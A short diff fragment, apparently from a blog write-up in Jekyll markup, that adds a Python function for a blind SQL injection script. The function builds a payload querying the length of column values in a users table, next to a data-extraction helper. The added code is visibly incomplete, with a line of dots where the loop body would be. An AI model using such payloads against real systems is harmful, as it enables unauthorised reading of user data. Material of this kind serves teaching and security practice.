@@ -61,6 +61,14 @@ def find_data(column, length, column_num):
                 data += ch
                 break
     return data
+
+def find_columnLength(column, column_num):
+    length = 1
+    while True:
+      payload = "cn' or (select length({}) from users limit {},1) = {}-- -".
+      format(
+            column, column_num, length)
+      ........................................................
 {% endhighlight %}
 
 
